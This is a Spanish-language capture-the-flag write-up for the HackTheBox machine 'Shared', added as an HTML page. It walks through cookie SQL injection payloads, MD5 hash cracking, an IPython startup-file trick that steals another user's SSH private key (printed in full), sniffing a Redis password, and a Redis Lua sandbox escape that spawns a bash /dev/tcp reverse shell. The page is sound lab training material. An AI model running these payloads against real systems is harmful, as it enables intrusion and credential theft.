@@ -1,0 +1,292 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Shared HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/shared.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Shared HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Shared de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Shared de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Shared HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Shared HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Shared de la plataforma de HackTheBox","headline":"Writeup Scrambled HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Shared HackTheBox</h1>
+          <p>Resolución de la máquina Shared de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.172
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https</span>
+</code></pre></div></div>
+
+<div><p>Si hacemos un curl vemos que nos redirige a un dominio</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> 10.10.11.172 -I
+HTTP/1.1 301 Moved Permanently
+Location: </span><span class="kd">http://shared.htb</span>
+</code></pre></div></div>
+
+<div><p>Es una tienda, podemos agregar al carrito y encontramos un botón proceed to checkout</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Al hacer clic nos lleva a un subdominio donde podemos ver esto</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>También podemos ver que arrastramos una cookie con el id del producto</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Podemos intentar modificar la cookie para una inyección sql de la siguiente manera</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">{</span><span class="s2">"' and 0=1 union select 1,2,3-- -"</span><span class="p">:</span><span class="s2">"1"</span><span class="p">}</span>
+</code></pre></div></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Recargamos y podemos ver en la respuesta que es vulnerable</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Podemos hacer lo mismo para saber el nombre de la base de datos actualmente en uso</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">{</span><span class="s2">"' and 0=1 union select 1,database(),3-- -"</span><span class="p">:</span><span class="s2">"1"</span><span class="p">}</span>
+</code></pre></div></div>
+<div><p><img src="./6.png"><p></div>
+
+<div><p>De la misma manera al listar tablas podemos ver que existe user</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">{</span><span class="s2">"' and 0=1 union select 1,table_name,table_schema from information_schema.tables where table_schema='checkout'-- -"</span><span class="p">:</span><span class="s2">"1"</span><span class="p">}</span>
+</code></pre></div></div>
+<div><p><img src="./7.png"><p></div>
+
+<div><p>Basandonos en lo anterior podemos ver un nombre de usuario</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">{</span><span class="s2">"' and 0=1 union select 1,username,2 from checkout.user-- -"</span><span class="p">:</span><span class="s2">"1"</span><span class="p">}</span>
+</code></pre></div></div>
+<div><p><img src="./8.png"><p></div>
+
+<div><p>Finalmente podemos ver la contraseña en md5 que podemos romper con john</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">{</span><span class="s2">"' and 0=1 union select 1,password,2 from checkout.user-- -"</span><span class="p">:</span><span class="s2">"1"</span><span class="p">}</span>
+</code></pre></div></div>
+<div><p><img src="./9.png"><p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> hash
+james_mason:fc895d4eddc2fc12f995e18c865cf273
+</span><span class="s2">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --format=Raw-MD5
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 XOP 4x2])
+</span><span class="kd">Soleil101</span><span class="p">        </span><span class="p">(</span><span class="kd">james_mason</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>Ahora que tenemos credenciales podemos conectarnos por ssh y obtener una shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> james_mason@10.10.11.172
+james_mason@shared.htb's password: </span><span class="kd">Soleil101</span><span class="p">
+</span><span class="s2">james_mason@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$ whoami
+james_mason
+</span><span class="s2">james_mason@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.172 
+</span><span class="s2">james_mason@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Estamos en el grupo developer, si buscamos archivos con el encontramos un directorio vacio</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">james_mason@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(james_mason) gid=1000(james_mason) groups=1001(</span><span class="kd">developer</span><span class="p">)
+</span><span class="s2">james_mason@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$ find / -group developer 2>/dev/null
+/opt/scripts_review
+</span><span class="s2">james_mason@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$ cd /opt/scripts_review
+</span><span class="s2">james_mason@shared</span><span class="p">:</span><span class="na">/opt/scripts_review</span><span class="p">$ ls -a
+</span><span class="na">.  ..
+</span><span class="s2">james_mason@shared</span><span class="p">:</span><span class="na">/opt/scripts_review</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Si miramos con <a href="https://github.com/DominicBreuker/pspy">pspy</a> los procesos podemos ver que el uid 1001 ejecuta algunas cosas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">CMD: UID=1001 PID=105513 | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython
+CMD: UID=1001 PID=101679 | /usr/bin/pkill ipython
+CMD: UID=1001 PID=101680 | /usr/bin/python3 /usr/local/bin/ipython</span>
+</code></pre></div></div>
+
+<div><p>Buscando vulnerabilidades asociadas a ipython encotramos un <a href="https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x"https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x>articulo</a></p></div>
+<div><p>Podemos intentar aplicarlo pero en el directorio que hemos visto antes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">james_mason@shared</span><span class="p">:</span><span class="na">/opt/scripts_review</span><span class="p">$ mkdir -m 777 profile_default
+</span><span class="s2">james_mason@shared</span><span class="p">:</span><span class="na">/opt/scripts_review</span><span class="p">$ mkdir -m 777 profile_default/startup
+</span><span class="s2">james_mason@shared</span><span class="p">:</span><span class="na">/opt/scripts_review</span><span class="p">$ echo "import os; os.system('cat ~/.ssh/id_rsa > /dev/shm/key')" > profile_default/startup/foo.py
+</span><span class="s2">james_mason@shared</span><span class="p">:</span><span class="na">/opt/scripts_review</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Después de unos segundos podemos ver en /dev/shm la id_rsa de dan_smith</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">james_mason@shared</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$ ls
+key
+</span><span class="s2">james_mason@shared</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$ cat key
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----</span>
+</code></pre></div></div>
+
+<div><p>En este punto podemos conectarnos por ssh y conseguir la flag de usuario</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> dan_smith@10.10.11.172 -i id_rsa
+</span><span class="s2">dan_smith@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$ whoami
+dan_smith
+</span><span class="s2">dan_smith@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.172
+</span><span class="s2">dan_smith@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt
+799**************************5ac
+</span><span class="s2">dan_smith@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver que tenemos el grupo sysadmin, también que con ese grupo existe un binario</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">dan_smith@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$ groups
+dan_smith developer </span><span class="kd">sysadmin</span><span class="p">
+</span><span class="s2">dan_smith@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$ find / -group sysadmin 2>/dev/null
+/usr/local/bin/redis_connector_dev
+</span><span class="s2">dan_smith@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Al ejecutarlo vemos que se autentica a redis por lo que debe tener una contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">dan_smith@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$ /usr/local/bin/redis_connector_dev
+[+] Logging to redis instance using password...
+
+INFO command result:
+# Server
+redis_version:6.0.15
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:4610f4c3acf7fb25
+redis_mode:standalone
+os:Linux 5.10.0-16-amd64 x86_64
+arch_bits:64
+multiplexing_api:epoll
+atomicvar_api:atomic-builtin
+gcc_version:10.2.1
+process_id:108223
+run_id:1d19d6ae5c3714b1793074fb911f2e8446793885
+tcp_port:6379
+uptime_in_seconds:3247
+uptime_in_days:0
+hz:10
+configured_hz:10
+lru_clock:14471405
+executable:/usr/bin/redis-server
+config_file:/etc/redis/redis.conf
+io_threads_active:0
+ &ltnil>
+</span><span class="s2">dan_smith@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ejecutandolo en nuestro equipo e interceptando la peticion con netcat podemos verla</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ./redis_connector_dev</span><span class="p">
+[+] Logging to redis instance using password...
+
+INFO command result:</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ netcat</span><span class="p"> -lvnp 6379
+Listening on 0.0.0.0 6379
+Connection received on 127.0.0.1
+*2
+$4
+auth
+$16
+</span><span class="kd">F2WHqJUz2WEz=Gqq</span>
+</code></pre></div></div>
+
+<div><p>Nos conectamos con redis-cli, buscando un poco logramos encontrar una <a href="https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/">vulnerabilidad</a></p></div>
+<div><p>Si la explotamos conseguimos ejecutar comandos, hacemos una reverse shell y somos root</p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">dan_smith@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$ echo "bash -i >& /dev/tcp/10.10.14.10/443 0>&1" > /dev/shm/sh
+</span><span class="s2">dan_smith@shared</span><span class="p">:</span><span class="na">~</span><span class="p">$ redis-cli --pass F2WHqJUz2WEz=Gqq
+Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
+</span><span class="kd">127.0.0.1:6379> </span><span class="p">eval 'local l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = l(); local f = io.popen("cat /dev/shm/sh | bash"); local res = f:read("*a"); f:close(); return res' 0</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.172
+</span><span class="s2">root@shared</span><span class="p">:</span><span class="na">/var/lib/redis</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@shared</span><span class="p">:</span><span class="na">/var/lib/redis</span><span class="p"># cat /root/root.txt
+04e*************************555
+</span><span class="s2">root@shared</span><span class="p">:</span><span class="na">/var/lib/redis</span><span class="p">#</span>
+</code></pre></div></div>
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
